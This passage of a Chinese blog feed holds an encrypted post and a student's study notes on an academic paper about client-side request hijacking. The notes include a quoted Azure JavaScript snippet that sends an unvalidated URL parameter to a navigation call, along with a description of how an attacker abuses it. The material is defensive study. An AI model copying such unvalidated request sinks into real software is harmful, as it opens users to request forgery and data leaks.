f74d49f9a2ba52f3ab9476f776448f568bf6a20777555f41268d713bae0d36c923a15f30dbdbb059d4bfa59f8bd2e315fc3fc9f8e7f32da40e1be0f19297396ef6672ac5975eb1600dbe9878c88e49232d7b02f3d01d712dc7f6d70d1c6d98ab8b69b5bd686ccc3c7b6057e251b6c73282b50363872567e275cd9a16ded5f0a3085b64de8ec5b9e511c0acee265f49f3a26c95edd83c2186993a241089798b494791538580c2705c692a7caf8b9e5417ce0513bff7b707c36b264281157fdd994cffc27a6298aa07a3c163a1780c36181a4fb55538e53f5323b65e789095771d4280e9d439bb53a3857d7573f3c8caecc719fc46f9e9a426a53b4ab898174502b147ab1995546bc78f05da0f227fea0024c9215b720df6ccf2b9ada9843b4a73159e0a43daf2737a6369aa7d623759075ed175f6e0b9c6cea92f427c2c886c8050adf20f7106089f8ebbd37cf36235c724683429406fc35f7a156f0d75bb3ceb0dc20c44c83eef580dee377588e1fdc952b68fab6447198f63394ce0faa26b91d411a692dcd7e3e42e0cfacfc4c8fa4b73b64d74a79196310d82fae75202058ad7076e138bc4700f8f5cabd80192df12eb0380889f04a6da4311cbdbec19e095329d10411587d9f2fca732d31edf2250b6819bc260e98a6736f67e2c9294c6dba3c29ae28a6737fb1355b73c40e7ceb0b88d1fd09b45684d80fa9c5df85118aec74239323e91a2d1fdc7912d847fd0a7851ddf3a23392452dac4632c72df8d74f1694f2361f10243df75ea941d5c74ad0c585db260e26266da13275b7032a826bfab8eda3520bb9946b676ee255d572081b15b63ff4548afb24670a1ab6fc8c9ad7416ead22c79a61a26fb6845eaa358e2b3f948df51707a53814dee0ea7df012b644d7e09b52b6404ddb2cc2808bc57883639af7e83764176a296a218458983752452cd8077eeef7914a2a7946866e80668f00c7e7c0581bb07c0d461504cea7df2dc7065e040fa9044ff098597d56d625e005e8e79e0989438dd02b45b37a469d7ee77a0da33a42ce8fd00e9e29f649bcf85e3e4589b6a9f8e0cfd69c86cd99dd90acdd323981281c567b7cd51b976901379a4a9be7c2d89ee4222665ddd99ec0b9e773bb2cf090bf04c708044b24820ab73d33ad43e22e48ef72c238c0b7cfa0615111063289c27757bd480a1ce06387e59a19e812b57745c5cc360004a08bd8f7746d2eec2552529c27e1c6d8954311169b5438b20baa0938bfeee8a07a63f300c59cfc29846a5584b3af7a508027ed41b574e11a1657ab4d8f997f03fbce8a80f8a8b8c2546ecd59ab1061ed75a074a522db98eb52d5b9f8ed57f4b73963464a14050124db310720205e5f0aa71e1f72f9cf0ef6a7f31b25a5e9851a9539aa92e352d642ea1b28c80b5ed1fdbc848a1989930c0d1f3495b1adfe7f41abb8108e78269863b2b8e778d9660ddfcea93881e70c54b0663077587be95c22ed1f7228f8cb5055dfed1a6c82ebf3c649b00cb835cde0face2b9f1bcd58daa2981458647210eef789f9307ba68844e442877a5b346a1c4538b7471a472e60d6a3690c55467bc773e192b631657a95e12b598a4932ad6a07c5e81a3ee53196ae855713ee0b6c15194a8ba2e8f51b54602d66a722947ee4b66627ba546e743e7675cf9d86ba1751801352a1a989b97b343413e86624925f616d38d4f2509039b39f7704096bd02682e8b5abe623f24edc69fb71b5ee7273a82d6ea416a3349592d081a833eec0ddafeb0e2570f4e828779f815f62cd76fb7f7dbb9308f528334f7885b7764cc5356d5c719bf18923e01a46a9fea4ac7b63647c928044bb0642d2fbc06ceb0897d17a80f706a6e4bc865925a263cb1ab412919f7b69be4470ec7b3a6701a46a1ce47ec9418e084d5d323f47ac33dc16208e403fbd790372bc7908b2b875b288a721d612fb22800a9151063a8125bdee80128e683d37a673b5ee2e5375a12f7d5e5e5ad377975ece483904cd4e4291f339e57556398fdc7e35c079ec9bd06788994c3c72cafa40a5728b299b6e6c2a1b6e70dc8fccecc91d868a68a737c42ec61bb4f7abbee00722c1320d825a63b2de4be7c7ab94bd5610faa461906ec365bcbcdcfb4789721e9e6153b25edfe2575a3e920d67b4ba10d24d68322d4cfd94782aeb213e3cceb79a93f0567ab0c2c57f41b6b2c5af7c190f8bbc9aa8095ec4614d6cfc9bad2c7db68d232165370b60ff85ac06886933f9efeb8ba93c322c352b0f925787a0020b5e5aceef8716d838d6c248a8b6a466fba5d040391f5e90e955fe40a598952d3e27e1d920ed5e28e1ceb1ea9476c9357716d86476e86419403ded3ed82d474067f91fbec739705594afe4e52a6d5f00c2b3ed37e19b69b2171c10d488f941d8a03333156a49269379c832780724f1735deda444cca4c52019e56e47f373ddce381a39c7a451eb2b4396fb137dabd012ccee817282efc94f564af60bfb8c4bf8b22691d0eb5fe3c0b7c16c5500b0bfef8790e831295b4e0f51ab4cbc60e771857cf2f417ba880f7cbcb3b51999ad5044c06ef1e5fdb98bee3f82d8ce60fb2607f34dd87a2fe6bfb0a63ce84aa219de314a92960ff0343dc65c21cde0565e61a8f7cf2868f3a5401a87e2fe37f87b46b9c872672961015d6cfe33312a5dfd67757eb4c1fa89a85f1b39e5c38658952c10c646aad6d8b4f1b15c3ef14785cb693e7a904b7c2936e37427c3aaa768336020de97313a0c8cb8c2fbbaeb167fa3fe5ef340154771dc0720ae93aaef6c5664283eeb30db8a1622c89477a6e868e6e32c82771922929648c9c3f39f46b78f06dc224efadfc25c71ce57a518317f460d93af4e08606fbe16eecad6fda1dd32718bfc3cb66f1988b0aad094eb5f8e8cb5dd42fe567a1e69cd9bf24429f3614f959ec243640f865e1dd350db1feb19b2924e2bcd294b821a40a9fd2aea578023988153d0b18622c3ac2887199a9b80807f3fe863f284c68368adc6cd225f8e53bdb71f55cb09151cd3df2694a528542a2663b820d5dc00bfc097736a5a4b33afbdc8ba8849cf62dcd9e21f7d22272cfbfb71ab727c089693772945a862b2df791f431a846c787b7000a81e0db6047fc5316a066167d0841bd96ce753257ace4351a49ab92212dd85e4aaa8edc1448a4551a8715b7dcd164f5f0999dbcbde47d476e2211d33c247e221aa0a0439aed8356a74eb0d0e67e93bc826cddd3b7c4b41deb87d9193802a78be4acf7dfdfac4bdf0bf3456872b38a25e13f9b72784ac5839b6dbd679f3ea8462a809e9a23213c0b986c1d87b08f721766569c21169d4869bf0c4b9fcdc6040b3405f43ca89362f016a88210bc2275a45d93a3e06f5fbc712648b7309811f2a545eae79a1b86669cc9f6713ba054345a8252adb4bf8365c386efa6d8bf3fa2d5754d6741fb4dad9f3a2ae8b6f55acb7eab8cb420389a4364ebdc28a9a2257706d767a783d64b34a78793fa0b08e7b0cfc9a71599154cc22fa1ec52787a7aedb3a92bb947de8ed8c82da86579ca5b19fb4fa3656c86d36fc91df20bfef31e03917df4f010ff3df9139a355168f682a8d4bc5a74687cb145dcea76678e67cefe1e1b756c22fdd0ad97f7a420ee8da23f084096b3c0a12dab5e127b2d6855029a96c56024abe66be0fbcb10ba3ed60890805d86b9052fcf8d4c064c810704ab6b95518ba05f60e2e0b0eeed4bc47532817b4669a98709d00c421161e4d4333baa79f905d325d3f0673853743b2e399225f274aae69f4ca8bbf02b40f859e5466f3943e45cfa00c22f1a1aa325d203a5121af83ecc171cf21eb56527dc63005a66374e181b2fb8ed68b4c1855954794f1c781a8ac7929f95ba9b1fd004c4d88027eb29d025abce43986c2b3eeb78b9456252c44fb3a24dcf8b062df65ad22c3ebe14ea9b7cf2349d2128b48ed77178947a2f77f3c871bf99064f4cbfa24fc8dff43a4c84dbce253173cb00856ed1576cc8a93fceaec9db618c9ecf764d6e11b2cfc70ac334cec2ce2d5387ada213af9c5d1cb3616b945b183b5010a110c3b479fae6f50ebcd1bd6e3318f6978d4ef023c46625a362bfced8a73461cfedabca67d445039291913fa80bad3343c960ced1542dde3eb07d6b40546bb3c0b6abde3ec1aaafc69ff486d7d49ab28cab2a652f061139b40d924faa35142ca80ea22e1acf9d976c97c272ec4aba8492053720780a51c74773a9e75f83b8c7c43cfc2c116ab5cd379d5f17944e5e39f946956952b855b1801ab5967ed7eb040116c594f915b4df2c9f55a60f9b526f0040de58d8ec9c61cb39e894ce766c1c848613f7e18de1bacc4de6f0f4d8e4ff5031dcc5d819b161bec02193562b7227901fd0ef6ab9a3777b4d219b90c36913e2ae4f5da9c601e13cdf49fd75cbaf4b6c075dc35e540c9865efc031f9d8c818ef8ac5d235987678b7a3d4011fe343f4299f6d4dfe07f783d5ded26ef31e9b5051542ebd63279c2a3c9ea0404fffdf43cf1f65e6b9150e8d4f9f9a07f64ceb711064a993517062167d4e8d94812e7e60f9b42b82ed36efa14adbbb47e4e69d9b9056bc0c0bf5900b7e9b3589eaea3ec2f42cd468fbba03c6e48fa2c92a3e057f60a3dda1ce8824f6667f1f10bab0b88ebe95f7563599db3fe8d98b7a2a540bc544f1639dceb4b333c25ae060cf27d676569d1be92edbd6545a08f281b9f351afb0347c8c353b83676619b96dd81b618cefcc5c290133c9209c96a79d118d872e479e29825d09b3bb28b6971c7385d9ecdffdaaf6fc017deab2d234f5219e516ad000ec276bf0866f2c68f1fcae7f8044ed3d279b8a277e081737ed6c471a6a1e935f9b508f0e05dca09750235a13b4d97b4ae3a781e68bbe931e3ce9b8ba1e2f7eda7960bedcdf4a0173754eb217d4b43dd38f0f65b5a057ed7a9fadaf398ac01b5d4b4255bb9b6a0b1573890f39d3e9276ead1babaf951523932610a529d56dfe859ce2916e9453e1e40447e74f2a8faa724509ae80d9a46e4f019a23830921096356056dbe049206e125388d735aa5a4481d243837f2fba300cb81d17bf780d3d6d1f436c5a54428672fef57d925fcdb78833697142438ae31eaaea3c3ebf8d0e94a077caaa367fdf3ac75c754a8782ded94479354e50028457403ce59d9cc37e0c4a1f820ae5d7d158213dd42a19a396b701a5b7e1c309d149cad2e5ea66aee6a6ed7cc359141375c34dc7a12ab0953f85f50b51d9bd1a57d5cc90202c4acc6a44ab4142b264aecd52f74828a419b616d23276aac1ed94a54b9f6a7ae66bbb44e75a389c5b6b49e3fef532b257f557758bd06be55bfc962ea55ea9c4146192f784d22c11196896026285f23dbbff145550cfc2a102689059f0f5d35592ad6516a284b70f7a4788928340f6b8c32dadd73d9a34ce17af2fa8c2a5e5276505f0feaf3166ce81e38c0d3c369b51b6907e4ab9334a46a779a77de87072a24b4cf72d73d6622add7324d3b6c338d58620e0685ba4d837ab1ed080a03accf09675cdca28be3994d067f514721b43947fb5ac152092b21d53cfb8b80f79e3754407186da35ed6310f12af238de735558006e94596d3bd0b60d6d928ed7e636172853eb306192472ae800b13d3d338042abb20c20419dfbe8e7803e8d566510e63c85ddae0bc3a36c7c12962326da1d8149ffe6e8b9972db59acac4587425fcb917c1b5ab47d49635422d167f8bd36ff397d0b9f9951f240467c79795db5dcd18b48e3187e12b300ff0e656989860f130372c690d24053840bdbbd303b59a915b26b630ecc9cadc8a651c506818b9ff55a0d9a4ea4805988df835aabdb94b541bc948dad5f1b414145e50e253d7d45cb40334f3ef6baedb4bb8093abe62eac5abce8253f2bfb49b9c09eb15d9de5f7f4e15c7e1ae60d6ec0588a85334870a54393f474ffecc89b481935cb04c675f32912da983a65789e8cf328785dcda11f7fe1b90f4c1f75235dcb4e0e459f3c5cd66822137c3354eb0cc7be6174c412280ad8ad5ab831baa27021b65e9e8e65792e341d779323e53fda6af7a62ff2b87fb72e891633ac3f4e4ba2c8cd107d4e631471b7546c873b8dd902903633397058097166e82157f231cca55c4c2e753ad5d7cf6d386a2b6fd705f913cd7a04a58512cc9c8629876738354ffac25187c39fb3931a3e229d387ebafac8f07ab7b96bd2b0363b3ca3ba5624e4524047ce30f0ec0c4446d713fe5c9b2bf6667b854928a6eefd3b8bf224f8b2d8a951ee3bfb2b864da3872a266ae98509414f678a35273e753efb87a955f3649db5c7a39d4bbe5e19238443283732624e0e655ef5770d7d27ac65b99bdd3c06ba39da96bd16b45505c8f4d5cace19c8c1071f3694bda0ea1bc08b49d9a04042313990af7af198d5b00fede8b3a70076c9dd6d544dadbf1352c3891d56c290373120085787e32170128778fa699b4ea5a64f03ea12835539fa18df6f2f3594ec4e160799fa9b043ecf522721b58003592ff105043b07cfdd85efaa9a702eb1f858d1eeb3dfabc4ef9b170170690e9d50006c8fc517e0dadc02963baaf61462c281974cb16eba97e81d1843f543b73dd52bb0b206ba5daab72a0c7e03cb75721991b0162a1ca0b37cd2317c8a01893e859f071c64da3c4d3cd7394506b980fcd790c3dab2d4a4ba02399362ded05cc6d3fa0d305b9af379d038d21bccda50246ec1d6ce9c59828b8709a2ed6cfa1765aa1dedc459518d9855cc0da972f59c17039ed0dabe2cf93f9b57e1fa1dee9a9bba811459a753d7c98b9a282bff76dc8cd515d84d8eb9ba2005abbba50fa46f19dfe381ae98a8d28d44eca2409f70cd62ef34e381cdf658cca08b4f2474f872455b9e5a3f11d48271f265010650a210a4edf766833b79b5039c9c89786ddce787afab98f6eade21b83cf1aba46afdaf3bbd3b186070ff45720a331c11d3354a02601db4fd036e0c6d9b1ac7f06aef946c7e16e5a081f40959c8e6dbe34f2cfd697e9ca94da4320a59b08a3dce7d68157f6a4dd2da4ec70ebd5cc9feb89a4ede6b02a1f9a8b7fc3897a935f7fa5ec2a7d6dea70a58f9796deb7363c0df7c8492fe33151fbb3f4157249ca7f10cfd14470d58dffaec58b4714ab9c452ad071186dd2a5db88f04f4a413d025ac69905cd4b216278f2e4a54c029360393c54a61e4501a35507d2eaff2860a0427a8e28eab71f9b3b97d01dcdf47afc2c0079a9a44ec64fa9250a2312c0bf61939dec14813ef22f619d07ac04641536e3bf0d96b49b3b050d8155d45bed78258448d3bbdc5d7c4a708deee531ca8cb0b5de05459e144e1a45869a60396c54eaccf2bbdeff4bea519dc7835c47cb28d0c6672f18829ab9bd9a49d65f3a7699c4731376ff937a86b0032d4647f451fdc3eb4f331e758a35fcb07e3ebb57deccf959832077199ee7a20b43183bd2780ba03a1174d7e719ef25d04e134cb0638bdb322590db29a78563e780331bef37df6db95b31fa19404906afaa12707f4f5b57da0aa2c0a4bd6e90e3f59baa3f2e59e66123d79eeef0cfb41b4fd256a79264a7e2595aa9fdf51b4c88dab91b8560111fbc251975fa31a4c2ba909819e8d5bc95d4f4428d7309d8842beaac7c46b7ba9dc74c0fb4325bceceeacd79b3cd0f0fa2ccf58301836e4d6f06d09a311a861a06f27572edd4489755fa3e91542af034f94e9785d2af6ee27bee93f74b2f7c71a2e928642832fb168f327cbe684723c996a872b8a28c4b3e4bded5eb0f3441ac268d7fb07c87ae3aeec6c894a421be45703330f695869cd68e1d8999ba5627dea4247818fa7810139ef83d8b1e079b8eeceac58fbcc1435da09217c1b573f17ab125376d9a47b7f9ace304fab5b50d7177e03c98d9200d5c029ac61ec8fb1ab0f383e14590c32a2ac71b24f7181b0a6c484b80778b5a42dd714f6038d30a5313daea7b3a581a59f8a63568fef1b3c4a31818c7476cc3d50757525674b2e08773f1aaea4f59c7de4d9a343877548118c56113da04fcd02736dd19d0371bb8d14b5ce227dcae287422adca4dd295590039cf998e50be8f5d17822e280c139538731f7a86a90c903e702144fb6fcb263f9642254657d5840faf855a1898d781da65a9568e4b52f922bbcd82a0347febced57ad96279a2154644a33138ef6f8fe9ad801855c505ac51394fa183a4c877750a55464f176c39fac12be95f4ca160899de73bd8d040c83e2e0b748f9d7de917c1b24f3715aa415dcb0ade6e928bb39110e557104fd32bb196505408202fe86da0efa97bdd6255f2d7117c9f94731ed5dcb1b4701c5f94f971f8529caa5fd9a80d7eb7be56feff90a218376f07c4671bf60a24bcd8e885aca1b08218e0a8433</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件工程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文阅读1</title>
    <link href="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/"/>
    <url>/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/</url>
    
    <content type="html"><![CDATA[<p>大三某课程作业🐸读一篇网安相关文章。选取到了S&amp;P’2024中的</p><p><code>The Great Request Robbery: An Empirical Study of Client-side Request Hijacking Vulnerabilities on the Web</code></p><span id="more"></span><p>伟大的请求劫持：对网络客户端请求劫持漏洞的实证研究</p><p>关于为什么这里使用请求劫持这个词而不是伪造，个人分析，伪造是手段，目的是为了达到劫持这种状态，想一想，攻击者能够伪造受害者发出请求，怎么不算劫持了受害者的请求呢。</p><h3 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h3><h4 id="原文翻译"><a href="#原文翻译" class="headerlink" title="原文翻译"></a>原文翻译</h4><p>​请求伪造攻击是<code>Web</code>应用程序最古老的威胁之一，传统上是由服务器端混淆的代理漏洞引起的。然而，最近客户端技术的进步引入了更微妙的请求伪造变种，攻击者利用客户端程序中的输入验证缺陷来劫持发出请求。我们几乎没有关于这些客户端变体的信息，它们的流行程度，影响和对策，在本文中，我们对Web平台上客户端请求劫持的状态进行了第一次评估。</p><p>​从全面审查浏览器<code>API</code>功能和<code>Web</code>规范开始，我们将请求劫持漏洞和由此导致的攻击系统化，确定了10个不同的漏洞变体，其中包括7个新的漏洞。然后，我们使用我们的系统设计和实现了<code>Sheriff</code>，一个静态-动态工具，用于检测从攻击者可控输入到请求发送指令的脆弱数据流。</p><p>​我们在Tranco Top  10K网站的顶部实例化了<code>Sheriff</code>，据我们所知，这是对野外普遍存在的请求劫持缺陷的首次调查。我们的研究发现，请求劫持漏洞无处不在，影响了9.6 %的前10K站点。我们通过在49个站点上构建67个概念验证漏洞，展示了这些漏洞的影响，使得针对Microsoft  Azure、Starz、Reddit和Indeed等流行网站的任意代码执行、信息泄露、开放重定向和CSRF成为可能。最后，我们回顾和评估了针对客户端请求劫持攻击的现有对策的采用和有效性，包括基于浏览器的解决方案，如<code>CSP</code>，<code>COOP</code>和<code>COEP</code>，以及输入验证。</p><h4 id="重要信息"><a href="#重要信息" class="headerlink" title="重要信息"></a>重要信息</h4><p>​近几年出现了很多最新的请求劫持的攻击模式，目前还没有对这些方法的系统性研究。通过审查浏览器<code>API</code>功能和Web规范，我们将请求劫持攻击重新分为10类，包括新的7个漏洞。我们开发了<code>Sheriff</code>工具，用于检测网站是否存在请求劫持漏洞，这是对在野请求劫持漏洞的首次调查。通过工具扫描大量站点发现，请求劫持漏洞无处不在。最后，我们评估了现有防御措施的有效性。</p><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><h4 id="重要信息-1"><a href="#重要信息-1" class="headerlink" title="重要信息"></a>重要信息</h4><p>​主要介绍了传统请求劫持造成的危害，比如客户端代码执行、混淆请求、删除数据库等等。</p><p>​最近客户端技术的快速演进引入了更隐蔽的请求伪造漏洞变种，攻击者不再依赖混淆的代理缺陷，而是利用客户端<code>JavaScript</code>程序中的输入验证漏洞来劫持外出请求。目前的研究主要集中在<code>CSRF</code>及相应的检测分析技术。但是不仅仅是<code>CSRF</code>攻击需要被研究，它仅仅是较大的一个版块，还有许多存在于<code>JS</code>代码中的请求可以被劫持。</p><p>​同样的，最近的研究主要是关注到异步请求，像<code>XMLHttpRequest</code>和<code>Fetch API</code>，忽略了其他类型的请求诸如<code>push notification</code>、<code>web sockets</code>等等。再者，目前的防御策略只解决了混淆代理问题，但新的客户端输入缺陷导致的请求劫持将会绕过目前的防御手段。</p><p>​在本文中，我们首次对客户端请求劫持漏洞进行了评估，主要包括三个方面：对攻击面的系统探索，对脆弱网站的测量，以及对请求劫持防御的全面审查和评估。然后，我们提出了<code>Sheriff</code>，这是一种客户端请求劫持检测工具，它结合使用混合程序分析和浏览器内动态污点跟踪来发现潜在脆弱的数据流并进行动态分析用于自动漏洞验证的<code>API</code>工具。</p><h4 id="重要名词简介"><a href="#重要名词简介" class="headerlink" title="重要名词简介"></a>重要名词简介</h4><p><code>fetch</code>：JS中的函数，用于向服务端请求资源。子请求受到浏览器的同源策略和其他安全限制的保护，因为它们是在同一页面上执行的。</p><p><code>XMLHttpRequest</code>：一个内建的浏览器对象，它允许使用 JavaScript 发送 HTTP 请求。两种执行模式：同步（synchronous）和异步（asynchronous）。子请求受到浏览器的同源策略和其他安全限制的保护，因为它们是在同一页面上执行的。</p><p><code>Top-level Request</code>：顶级请求是指在浏览器中执行的导航请求，例如使用<code>location.assign()</code>、<code>window.open()</code>或通过用户在地址栏中输入URL来导航到新页面的请求。在顶级请求中，<strong>浏览器会将当前域下的Cookie发送到目标域</strong>。这可能会引发安全问题，特别是如果目标域是恶意站点，它可能会收集和滥用来自其他域的Cookie信息。</p><h3 id="CSRH：Client-side-Request-Hijacking"><a href="#CSRH：Client-side-Request-Hijacking" class="headerlink" title="CSRH：Client-side Request Hijacking"></a>CSRH：Client-side Request Hijacking</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>CSRH漏洞描述：攻击者可以欺骗受害者的客户端使用攻击者自制的输入来操作发送请求的API。比较出名的漏洞实例像是CSRF这种。</p><p>在Microsoft Azure网页中发现的一个可以被劫持的top-level HTTP请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> params = (<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>)).<span class="hljs-property">searchParams</span>;<br><span class="hljs-keyword">var</span> t = params.<span class="hljs-title function_">get</span>(<span class="hljs-string">"request"</span>);<br><span class="hljs-keyword">if</span>(t != <span class="hljs-literal">null</span> &amp;&amp; t.<span class="hljs-property">length</span>){ <br>    <span class="hljs-comment">// post message to opener</span><br>    opener &amp;&amp; opener.<span class="hljs-title function_">postMessage</span>(<span class="hljs-string">"reauthPopupOpened"</span>, t);<br>    <span class="hljs-comment">// listen for signal</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>){<br>        <span class="hljs-keyword">if</span> (event.<span class="hljs-property">origin</span> !== opener.<span class="hljs-property">origin</span>) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-keyword">if</span> (event.<span class="hljs-property">data</span> === <span class="hljs-string">"sendRequest"</span>){ <br>            <span class="hljs-comment">// top-level navigation request </span><br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">assign</span>(t);<br>        } <br>    }<br>}<br></code></pre></td></tr></table></figure><h4 id="威胁模型"><a href="#威胁模型" class="headerlink" title="威胁模型"></a>威胁模型</h4><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_10-19-56.png" class=""><p>上述漏洞的利用实例：</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-18_16-09-53.png" class=""><p>攻击者准备了一个恶意页面并诱导受害者去访问（或者直接分享给受害者存在漏洞的页面，个人觉得这个不如前面那个方法，前面那个方法可以隐藏恶意<code>payload</code>），这个页面会打开存在漏洞的页面，并且此时已经插入了恶意的请求参数，当新的页面加载完成时，上面那段JS代码会加载恶意参数并发出<code>top-level</code>请求，由于是顶级请求，浏览器会获取<code>cookie</code>，从而绕过同源策略，劫持原始请求。</p><p>在这篇文章中，研究者们不仅仅关注http形式的URL，例如像<code>location.assign()</code>这种API也可以接收URL。劫持了<code>API</code>后，攻击者将会扩大危害，例如<code>CSRF</code>、客户端代码执行、重定向等等</p><h3 id="问题陈述——即本篇论文解决的问题"><a href="#问题陈述——即本篇论文解决的问题" class="headerlink" title="问题陈述——即本篇论文解决的问题"></a>问题陈述——即本篇论文解决的问题</h3><h4 id="RQ1：浏览器功能带来的攻击系统化分析"><a href="#RQ1：浏览器功能带来的攻击系统化分析" class="headerlink" title="RQ1：浏览器功能带来的攻击系统化分析"></a>RQ1：浏览器功能带来的攻击系统化分析</h4><p>​我们研究用于发送请求的各种浏览器方法和 API，并用特定功能标记每个方法和 API（例如，接受 javascript URI、允许设置请求正文等）。然后，我们回顾现有文献并进行全面的威胁建模分析，系统地评估攻击者可以操纵请求发送 API 的各个领域时出现的安全风险。</p><h4 id="RQ2：漏洞检测、漏洞存在率及其危害"><a href="#RQ2：漏洞检测、漏洞存在率及其危害" class="headerlink" title="RQ2：漏洞检测、漏洞存在率及其危害"></a>RQ2：漏洞检测、漏洞存在率及其危害</h4><p>毫无疑问可以推出，我们对真实网站中请求劫持这一更广泛问题的总体影响和普遍性几乎没有任何信息。</p><p>在本文中，我们的目标是通过量化野外请求劫持的普遍程度、识别易受攻击的行为并调查其影响来填补这一空白，以深入了解影响 Web 应用程序安全状况的根本问题和因素。</p><h4 id="RQ3：防护措施及其有效性"><a href="#RQ3：防护措施及其有效性" class="headerlink" title="RQ3：防护措施及其有效性"></a>RQ3：防护措施及其有效性</h4><p>当前许多研究的重点只是利用混淆代理缺陷的传统请求伪造攻击，因此，我们仍然缺乏对各种防御机制针对请求劫持客户端变体保护范围的全面了解。</p><h3 id="API功能带来的攻击的系统化分析——对RQ1的讨论"><a href="#API功能带来的攻击的系统化分析——对RQ1的讨论" class="headerlink" title="API功能带来的攻击的系统化分析——对RQ1的讨论"></a>API功能带来的攻击的系统化分析——对RQ1的讨论</h3><h4 id="浏览器API功能"><a href="#浏览器API功能" class="headerlink" title="浏览器API功能"></a>浏览器API功能</h4><p>本文的研究者们从<code>WHATWG </code>和<code>W3C</code>的存储库中进行了系统性的搜索，重点搜索了其中能创建网络请求的JS <code>API</code>，最后选出了6大类一共10个<code>API</code>。这些<code>API</code>都有不同的特点，并默认受到某些约束，例如同源策略。<strong>研究者们认为，加入CSP、COOP等额外策略并不能影响到底层软件的缺陷。</strong>在本节，本文的研究者们聚焦在这些默认受到约束的<code>API</code>，希望发现默认设置下的可能攻击方式。</p><p>研究者们探索出来的10种<code>API</code>：</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-18_21-25-53.png" class=""><h4 id="CSRH攻击的系统分析"><a href="#CSRH攻击的系统分析" class="headerlink" title="CSRH攻击的系统分析"></a>CSRH攻击的系统分析</h4><p><strong>基于第2.2节的威胁模型：攻击者可以控制4.1节中提出的API发出的网络请求中的URL（在这里可以认为是请求头和请求体）</strong></p><p>本文的研究者通过系统地分析前人的资料，并检验了那些由于攻击者能够操纵每个发送请求<code>API</code>的不同字段所带来的潜在攻击。结果发现了一共10种CSRH攻击变体，并且其中只有3种被熟知。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_11-31-49.png" class=""><p><strong>以下列出几种脆弱的API及其存在风险：</strong></p><p>​<strong>异步请求(Asynchronous Requests)：</strong></p><p>​像<code>XMLHttpRequest</code>或者低层次<code>fetch</code>这种没有造成顶层页面重载的异步请求都被常用于和web服务通信。攻击者操纵URL、body和header等等都能导致客户端出现不可控的行为，代表就是CSRF攻击。这种攻击方式可以产生信息泄露，攻击者将受害者的敏感信息如登录凭证包含在请求体中，发送到有害的主机。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-18_22-12-33.png" class=""><p>​<strong>推送请求(Push Request)：</strong></p><p>​Web Push API是一种用于实现推送通知功能的Web标准API。它允许网站向用户的设备（如桌面浏览器或移动设备）发送实时通知，即使用户当前没有打开该网站。当推送订阅没有做好CSRF防护时，会产生CSRF攻击。</p><p>​服务工作者是一个JavaScript脚本，运行在浏览器的后台，独立于网页。它充当推送通知的中间人，处理接收到的推送消息并显示通知。</p><p>参考<a href="https://m.freebuf.com/vuls/200711.html?utm_source=joyk.com&utm_medium=referral&hmsr=joyk.com">谷歌推送接口劫持实例</a>，没有做好CSRF防御的PushRequest接口导致的经典CSRF攻击，从而造成用户信息泄露。攻击手段我画了下面这张图：</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_13-38-39.png" class=""><p>关于论文中提到的推送API造成的客户端DOS，我没有发现公开的实例，只能作出下面的猜测：攻击者通过某种手段获取到了用户在某网站的cookie后，通过模拟sw.js请求，请求大量推送，从而对目标浏览器造成DOS攻击。</p><p>​<strong>服务端发送事件(Server-Sent Events)：</strong></p><p>​<code>SSE</code>是一种服务端向浏览器推送消息的单向通信机制，而<code>Push Request API</code>则是一种允许客户端发起请求并接收服务器推送消息的双向通信机制。</p><p>​原文中说攻击者操纵参数就可以实现劫持，这里没有看到合适的实例或者更清晰的解释。好像国内外对此研究或者攻击都比较少。先放在这里。</p><p>​<strong>Web 